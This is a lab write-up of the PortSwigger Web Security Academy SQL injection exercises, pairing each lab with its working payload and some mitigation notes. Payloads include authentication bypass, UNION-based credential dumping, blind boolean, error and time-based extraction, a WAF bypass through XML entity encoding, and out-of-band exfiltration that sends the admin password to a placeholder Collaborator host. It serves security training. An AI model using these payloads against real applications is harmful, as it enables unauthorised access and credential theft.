# SQL Injection — Lab Write-ups

> **Topic:** SQL Injection  
> **Platform:** PortSwigger Web Security Academy  
> **Labs Completed:** All (Apprentice + Practitioner + Expert)  
> **Tools Used:** Burp Suite (Proxy, Repeater, Intruder), Browser DevTools

---

## What is SQL Injection?

SQL injection happens when user-supplied input gets inserted directly into a database query without proper sanitization. As a tester, you're essentially talking to the database in its own language — bypassing whatever logic the application put in front of it.

The impact ranges from reading hidden data all the way to full authentication bypass, data exfiltration, and in some cases even OS-level command execution. It's been on the OWASP Top 10 for years for a reason.

---

## Lab 1 — SQL Injection in WHERE Clause (Retrieve Hidden Data)
**Level:** Apprentice

**What the lab is about:**  
The product category filter passes user input directly into a SQL query. Unreleased products are hidden using `released=1` in the WHERE clause — the goal is to make the query return everything, including the hidden items.

**What I did:**  
Intercepted the GET request to `/filter?category=Gifts` in Burp Proxy. Modified the category parameter to:
```
' OR 1=1--
```
This turns the query into something like:
```sql
SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
```
Since `1=1` is always true and the `--` comments out the rest, all products (including unreleased ones) get returned.

**Key takeaway:**  
Always check filter parameters, search boxes, and dropdowns — they're often the first place SQLi hides.

**Mitigation:**  
Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.

---

## Lab 2 — Login Bypass via SQL Injection
**Level:** Apprentice

**What the lab is about:**  
Classic login form SQLi. The username field is vulnerable — goal is to log in as `administrator` without knowing the password.

**What I did:**  
Entered the following in the username field:
```
administrator'--
```
Password field: anything (it gets commented out).

The resulting query becomes:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```
Everything after `--` is ignored, so the password check is skipped entirely.

**Key takeaway:**  
Login forms are high-value targets. Even a single vulnerable parameter is enough for full authentication bypass.

**Mitigation:**  
Parameterized queries. Never build login queries through string concatenation.

---

## Lab 3 — UNION Attack: Finding Number of Columns
**Level:** Practitioner

**What the lab is about:**  
Before running a UNION-based attack, you need to know exactly how many columns the original query returns. This lab is purely about that — figuring out the column count.

**What I did:**  
Injected NULL values one at a time:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
When the error disappears and the page loads normally, you've matched the column count. In this case, 3 NULLs worked.

**Why NULL?**  
NULL is compatible with any data type. Using specific values like `1` or `'a'` can fail if the column type doesn't match.

**Mitigation:**  
Parameterized queries. Input validation.

---

## Lab 4 — UNION Attack: Finding Columns with Useful Data Types
**Level:** Practitioner

**What the lab is about:**  
Once you know the column count, you need to find which columns actually return string data (since you'll want to extract text-based info like usernames/passwords).

**What I did:**  
With 3 columns confirmed, I tested each position with a string:
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
The second position accepted strings without error — that's the column I'll use for data extraction.

**Key takeaway:**  
Not every column is string-compatible. You need to identify the right one before trying to pull data.

---

## Lab 5 — UNION Attack: Retrieve Data from Other Tables
**Level:** Practitioner

**What the lab is about:**  
Now that we know the column count and data types, we actually extract credentials from a different table (`users`).

**What I did:**  
```
' UNION SELECT username, password FROM users--
```
This returned all usernames and passwords from the users table right on the page. Logged in as administrator with the extracted password.

**Key takeaway:**  
UNION attacks are incredibly powerful once you've done the groundwork. Two queries, full credential dump.

---

## Lab 6 — UNION Attack: Retrieve Multiple Values in a Single Column
**Level:** Practitioner

**What the lab is about:**  
Sometimes only one column accepts strings. You still need to pull two fields (username + password). The trick is to concatenate them into one.

**What I did:**  
```
' UNION SELECT NULL, username || '~' || password FROM users--
```
The `||` is the Oracle/PostgreSQL string concat operator. The tilde (`~`) acts as a delimiter so I can split them apart. Output looks like: `administrator~s3cr3tp4ss`.

**Key takeaway:**  
String concatenation lets you smuggle multiple values through a single column. Know your database-specific concat syntax.

---

## Lab 7 — SQL Injection Attack on Oracle Database
**Level:** Practitioner

**What the lab is about:**  
Oracle databases have quirks — specifically, every SELECT needs a FROM clause. There's a built-in dummy table called `dual` that exists for this.

**What I did:**  
```
' UNION SELECT NULL,NULL FROM dual--
```
Then extracted table names:
```
' UNION SELECT table_name,NULL FROM all_tables--
```
Found the users table, then pulled credentials from it.

**Key takeaway:**  
Always know your target database. Oracle, MySQL, MSSQL, and PostgreSQL all have slightly different syntax.

---

## Lab 8 — SQL Injection Attack on Non-Oracle Databases (Listing Contents)
**Level:** Practitioner

**What the lab is about:**  
On non-Oracle databases, you can query `information_schema.tables` to list all table names, then `information_schema.columns` to find column names.

**What I did:**  
First confirmed column count (2). Then:
```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```
Found a table like `users_abcxyz`. Then:
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcxyz'--
```
Got column names `username_xyz` and `password_xyz`. Then dumped them:
```
' UNION SELECT username_xyz,password_xyz FROM users_abcxyz--
```

**Key takeaway:**  
`information_schema` is your map to the entire database on MySQL/PostgreSQL/MSSQL. Learn it well.

---

## Lab 9 — Blind SQLi with Conditional Responses
**Level:** Practitioner

**What the lab is about:**  
No data is returned in the response — but the page shows "Welcome back!" when the condition is true. This is Boolean-based blind SQLi. You infer data one bit at a time.

**What I did:**  
The `TrackingId` cookie was vulnerable. Tested:
```
TrackingId=xyz' AND '1'='1    → Welcome back appears ✓
TrackingId=xyz' AND '1'='2    → Welcome back disappears ✗
```
Then used Burp Intruder to brute-force the admin password character by character:
```
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```
Cycled through a-z, 0-9 for each position until all characters were found.

**Key takeaway:**  
Blind SQLi takes more patience but is just as dangerous. Boolean-based attacks work even when zero output is returned.

---

## Lab 10 — Blind SQLi with Conditional Errors
**Level:** Practitioner

**What the lab is about:**  
No "Welcome back" message here — the only signal is whether the application throws an error. True condition = no error, false condition = SQL error.

**What I did:**  
Used Oracle-specific syntax to trigger a divide-by-zero error conditionally:
```
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```
When condition is true → divide by zero → 500 error.
When condition is false → returns 'a' → 200 OK.

Used this to enumerate the password character by character.

**Key takeaway:**  
Error-based blind SQLi uses application errors as your oracle. It's trickier but effective.

---

## Lab 11 — Visible Error-Based SQL Injection
**Level:** Practitioner

**What the lab is about:**  
The database throws verbose errors that actually include query output. You can extract data directly from the error message itself.

**What I did:**  
Triggered an error that forces the DB to cast a string as an integer:
```
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```
The error message helpfully returns: `invalid input syntax for type integer: "actualpassword123"`

The password is right there in the error.

**Key takeaway:**  
Verbose error messages are a goldmine. Never expose raw DB errors to users in production.

---

## Lab 12 — Blind SQLi with Time Delays
**Level:** Practitioner

**What the lab is about:**  
No visible response difference at all. The only signal is how long the server takes to respond. You trigger intentional delays to infer true/false.

**What I did:**  
On PostgreSQL:
```
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
10-second delay = true. Instant response = false.

**Key takeaway:**  
Time-based blind SQLi works even when the application gives you nothing. It's the last resort but it works.

---

## Lab 13 — Blind SQLi with Time Delays and Information Retrieval
**Level:** Practitioner

**What the lab is about:**  
Combines time delays with conditional logic to actually extract data when you have zero visual feedback.

**What I did:**  
Enumerated admin password using sleep conditions:
```
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```
Used Burp Intruder with the character position and value as payload positions. Measured response times to determine each character.

**Key takeaway:**  
Slow but effective. Automate it — manual time-based extraction for a 20-char password would take forever.

---

## Lab 14 — Blind SQLi with Out-of-Band Interaction
**Level:** Practitioner

**What the lab is about:**  
When the app gives no response difference whatsoever (not even timing), you can make the database initiate an outbound connection to your server.

**What I did:**  
Used Burp Collaborator to get a public DNS endpoint, then triggered an out-of-band DNS lookup from the database:
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR_URL/"> %remote;]>'),'/l') FROM dual--
```
Saw the DNS lookup hit my Collaborator server — confirmed out-of-band interaction worked.

**Key takeaway:**  
OOB techniques are powerful for completely blind scenarios. Burp Collaborator is essential for this.

---

## Lab 15 — Blind SQLi with Out-of-Band Data Exfiltration
**Level:** Practitioner

**What the lab is about:**  
Takes OOB a step further — actually exfiltrates the admin password through the DNS lookup itself by embedding it in the subdomain.

**What I did:**  
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR_URL/"> %remote;]>'),'/l') FROM dual--
```
The admin password appeared as a subdomain prefix in the Collaborator DNS lookup. 

**Key takeaway:**  
Even in fully blind scenarios with no HTTP response to read, OOB exfil can pull actual data. Very advanced, very real.

---

## Lab 16 — SQL Injection with Filter Bypass via XML Encoding
**Level:** Practitioner

**What the lab is about:**  
The application uses a WAF that blocks common SQL keywords. Input is passed inside an XML body. You need to obfuscate the payload to slip past the filter.

**What I did:**  
Used XML entity encoding to disguise the UNION keyword:
```xml
<stockCheck>
  <productId>1 &#85;NION &#83;ELECT username||'~'||password FROM users</productId>
  <storeId>1</storeId>
</stockCheck>
```
The WAF doesn't recognize the encoded version, but the database decodes it and executes it fine.

**Key takeaway:**  
WAFs are not a silver bullet. Encoding, case variation, and whitespace tricks can often bypass them. Defense-in-depth matters.

---

*SQL Injection is one of the most well-documented vulnerabilities out there, but it's still found in production systems daily. These labs gave me a real feel for how it works across different database engines and in both visible and blind scenarios.*
